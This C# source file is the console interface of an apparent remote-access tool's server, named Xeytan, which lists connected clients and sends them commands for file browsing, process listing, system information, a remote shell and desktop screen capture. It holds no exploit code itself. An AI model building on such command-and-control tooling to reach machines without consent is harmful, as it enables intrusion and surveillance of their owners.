using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using NetLib.Models;
using NetLib.Packets;
using XeytanCSharpServer.Concurrent;
using XeytanCSharpServer.Models;
using XeytanCSharpServer.Ui.Console.Views;
using Action = XeytanCSharpServer.Concurrent.Action;
using C = System.Console;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpServer.Ui.Console
{
    class ConsoleUiMediator
    {
        public AppUiDoubleQueueThreadChannel AppUiChannel { get; set; }
        private MainView MainView { get; set; }
        private FileSystemView FileSystemView { get; set; }
        public ShellView ShellView { get; set; }
        private IView CurrentView { get; set; }
        private Client Client { get; set; }
        private ReaderWriterLock ClientLock { get; }
        public bool Running { get; set; }
        public bool IsDesktopActive { get; set; } = false;
        public object IsDesktopActiveLock { get; set; } = new object();

        public ConsoleUiMediator(AppUiDoubleQueueThreadChannel channel)
        {
            FileSystemView = new FileSystemView();
            MainView = new MainView();
            CurrentView = MainView;
            ClientLock = new ReaderWriterLock();
            AppUiChannel = channel;
            ShellView = new ShellView();
        }

        public void Loop()
        {
            Running = true;
            C.CancelKeyPress += new ConsoleCancelEventHandler(C_CancelKeyPress);
            while (Running)
            {
                string instruction = CurrentView.Loop();
                if (instruction == null) continue;
                if (!ProcessInstruction(instruction))
                {
                    C.WriteLine("Could not handle {0}", instruction);
                }
            }
        }

        private void C_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            if (CurrentView != MainView || Client != null)
            {
                CurrentView = MainView;
                SetActiveClient(null);
                C.WriteLine();
            }
            else
            {
                C.WriteLine();
                C.WriteLine("If you want to exit the application enter exit");
            }

            Loop();
        }

        private bool ProcessInstruction(string instruction)
        {
            string[] parts = instruction.Split();

            if (parts.Length == 1 && string.IsNullOrEmpty(parts[0]))
                return true;

            if (!HandleInstruction(parts))
            {
                if (Client == null)
                {
                    return ProcessInstructionNotInteracting(parts);
                }
                else
                {
                    return ProcessInstructionInteracting(instruction, parts);
                }
            }

            return false;
        }

        private bool HandleInstruction(string[] parts)
        {
            /*
            if (parts[0].Equals("exit", StringComparison.OrdinalIgnoreCase) ||
                parts[0].Equals("quit", StringComparison.OrdinalIgnoreCase))
                Environment.Exit(0);
            */
            return false;
        }

        private bool ProcessInstructionNotInteracting(string[] parts)
        {
            if (parts[0] == "ls")
            {
                AppUiChannel.SubmitToApp(new AppEvent
                    {Target = Target.Server, Subject = Subject.Connection, Action = Action.ListAvailable});
                return true;
            }

            if (parts.Length > 1 &&
                parts[0].Equals("interact", StringComparison.OrdinalIgnoreCase))
            {
                int clientId = int.Parse(parts[1]);
                AppUiChannel.SubmitToApp(new AppEvent()
                    {Target = Target.Server, Subject = Subject.Interaction, Action = Action.Start, Data = clientId});
                return true;
            }

            return false;
        }

        private bool ProcessInstructionInteracting(string instruction, string[] parts)
        {
            try
            {
                ClientLock.AcquireReaderLock(15 * 1000);

                if (CurrentView == ShellView)
                {
                    AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                        {Subject = Subject.Shell, Action = Action.Push, Data = string.Join(" ", parts)});
                    return true;
                }
                else if (parts[0] == "ls")
                {
                    if (CurrentView == FileSystemView)
                    {
                        string basePath = FileSystemView.CurrentBasePath;
                        if (basePath == null)
                        {
                            AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                                {Subject = Subject.FileSystem, Action = Action.Start});
                        }
                        else
                        {
                            AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                                {Subject = Subject.FileSystem, Action = Action.Start, Data = basePath});
                        }
                    }
                    else
                    {
                        if (parts.Length == 1 || (parts.Length > 1 && parts[1].Trim().Equals("/")))
                        {
                            AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                                {Subject = Subject.FileSystem, Action = Action.Start});
                        }
                        else
                        {
                            string basePath = Path.GetFullPath(parts[1]);
                            AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                                {Subject = Subject.FileSystem, Action = Action.Start, Data = basePath});
                        }
                    }

                    return true;
                }
                else if (parts[0].Equals("sysinfo", StringComparison.OrdinalIgnoreCase))
                {
                    AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                        {Subject = Subject.Information, Action = Action.Start});

                    return true;
                }
                else if (parts[0] == "fs")
                {
                    if (parts.Length == 1 ||
                        (parts.Length > 1 && parts[1].Equals("start", StringComparison.OrdinalIgnoreCase)))
                    {
                        CurrentView = FileSystemView;
                        FileSystemView.SetActiveClient(Client);
                    }
                }
                else if (parts[0] == "ps")
                {
                    AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                        {Subject = Subject.Process, Action = Action.Start});
                    return true;
                }
                else if (parts[0] == "exec")
                {
                    AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                        {Subject = Subject.Shell, Action = Action.Push});
                    return true;
                }
                else if (parts[0] == "shell")
                {
                    CurrentView = ShellView;
                    ShellView.SetActiveClient(Client);

                    AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                        {Subject = Subject.Shell, Action = Action.Start});
                    return true;
                }
                else if (instruction.Equals("desktop start", StringComparison.OrdinalIgnoreCase))
                {
                    bool shouldStart;

                    lock (IsDesktopActiveLock)
                    {
                        shouldStart = !IsDesktopActive;
                    }

                    if (shouldStart)
                    {
                        AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                            {Subject = Subject.Desktop, Action = Action.Start});
                        return true;
                    }

                    return true;
                }
                else if (instruction.Equals("desktop stop", StringComparison.OrdinalIgnoreCase))
                {
                    lock (IsDesktopActiveLock)
                    {
                        if (IsDesktopActive)
                        {
                            IsDesktopActive = false;
                            AppUiChannel.SubmitToApp(new ClientAppEvent(Client)
                                {Subject = Subject.Desktop, Action = Action.Stop});
                        }
                    }

                    return true;
                }
                else if (parts[0] == "cd")
                {
                    if (parts.Length > 1)
                    {
                        if (CurrentView != FileSystemView)
                        {
                            CurrentView = FileSystemView;
                            FileSystemView.ChangeDirectory(parts[1]);
                            FileSystemView.Client = Client;
                        }
                    }
                }
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::ProcessInstructionInteracting AcquireReaderLock");
                C.WriteLine("============================================================================");
                return false;
            }
            finally
            {
                ClientLock.ReleaseReaderLock();
            }

            return false;
        }


        public void ShowClientConnection(Client client)
        {
            MainView.ShowClientConnection(client);

            // Speed up testing
            SetActiveClient(client);
            CurrentView.PrintBanner();
        }

        private void ListenAppEvents()
        {
            while (Running)
            {
                AppEvent appEvent = AppUiChannel.TakeFromApp();

                Target target = appEvent.Target;
                Action action = appEvent.Action;
                Subject subject = appEvent.Subject;
                object data = appEvent.Data;

                switch (target)
                {
                    case Target.Server:
                    {
                        switch (subject)
                        {
                            case Subject.Connection:
                            {
                                if (action == Action.ListAvailable)
                                {
                                    List<Client> clients = (List<Client>) appEvent.Data;
                                    MainView.ListSessions(clients);
                                }

                                break;
                            }
                        }

                        break;
                    }

                    case Target.Client:
                    {
                        ClientAppEvent clientApp = (ClientAppEvent) appEvent;
                        Client client = clientApp.Client;

                        switch (subject)
                        {
                            case Subject.Connection:
                            {
                                if (action == Action.Started)
                                {
                                    ShowClientConnection(client);
                                }

                                break;
                            }

                            case Subject.Process:
                            {
                                if (action == Action.Fetched)
                                {
                                    ShowProcessList(client, (List<ProcessInfo>) data);
                                }

                                break;
                            }

                            case Subject.FileSystem:
                            {
                                if (action == Action.Fetched)
                                {
                                    PacketFileSystem packet = (PacketFileSystem) data;
                                    if (packet.FsFocus == PacketFileSystem.FileSystemFocus.Roots)
                                        ShowFsRoots(client, packet.Drives);
                                    else if (packet.FsFocus == PacketFileSystem.FileSystemFocus.DirectoryEntries)
                                        ShowFsDirEntries(client, packet.BasePath, packet.Files);
                                }

                                break;
                            }

                            case Subject.Shell:
                            {
                                if (action == Action.Fetched)
                                {
                                    Dictionary<string, string> shellData = (Dictionary<String, String>) data;
                                    ShellView.PrintOutput(shellData["command"], shellData["output"]);
                                }
                                else if (action == Action.Stop)
                                {
                                    if (CurrentView == ShellView)
                                    {
                                        CurrentView = MainView;
                                        CurrentView.PrintBanner();
                                    }
                                }

                                break;
                            }
                            case Subject.Desktop:
                            {
                                if (action == Action.Fetched)
                                {
                                    string path = (string) data;
                                    if (!IsDesktopActive && Client == client)
                                    {
                                        IsDesktopActive = true;

                                        C.WriteLine("[+] Desktop image received, Images will be saved in {0}", path);
                                    }
                                }
                                else if (action == Action.Stop)
                                {
                                    lock (IsDesktopActiveLock)
                                    {
                                        if (IsDesktopActive && Client == client)
                                        {
                                            C.WriteLine("Desktop session closed");
                                            IsDesktopActive = false;
                                        }
                                    }
                                }

                                break;
                            }
                        }

                        break;
                    }
                }
            }
        }

        private void SetActiveClient(Client client)
        {
            try
            {
                ClientLock.AcquireWriterLock(15 * 1000);
                Client = client;
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::SetActiveClient(Client) AcquireWriterLock");
                C.WriteLine("============================================================================");
                return;
            }
            finally
            {
                ClientLock.ReleaseWriterLock();
            }

            if (CurrentView.GetType() == typeof(ClientView))
                ((ClientView) CurrentView).SetActiveClient(Client);

            // MainView also takes care of client interaction
            if (CurrentView == MainView)
                MainView.SetActiveClient(Client);
        }

        public void OnClientDisconnected(Client client)
        {
            try
            {
                ClientLock.AcquireWriterLock(15 * 1000);

                if (Client == client)
                {
                    Client = null;
                    if (CurrentView.GetType() == typeof(ClientView))
                    {
                        ((ClientView) CurrentView).SetActiveClient(null);
                        CurrentView = MainView;
                        C.WriteLine("Current interacting user has disconnected");
                        CurrentView.PrintBanner();
                    }
                }
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::OnClientDisconnected(Client) AcquireReaderLock");
                C.WriteLine("============================================================================");
            }
            finally
            {
                ClientLock.ReleaseWriterLock();
            }
        }

        //=====================================================================================
        // Triggered From Application class
        //=====================================================================================

        public void ShowFsRoots(Client client, List<DiskDriveInfo> drives)
        {
            FileSystemView.PrintRoots(client, drives);
            CurrentView.PrintBanner();
        }

        public void ShowFsDirEntries(Client client, string basePath, List<FileInfo> dirEntries)
        {
            FileSystemView.PrintFsDirEntries(client, basePath, dirEntries);
            CurrentView.PrintBanner();
        }

        public void ShowProcessList(Client client, List<ProcessInfo> processes)
        {
            ProcessView.PrintProcesses(client, processes);
            CurrentView.PrintBanner();
        }

        public void ShowSystemInformation(Client client, SystemInfo systemInformation)
        {
            SystemInfoView.PrintSystemInfo(client, systemInformation);
            CurrentView.PrintBanner();
        }

        public void Run()
        {
            new Thread(ListenAppEvents).Start();
            Loop();
        }
    }
}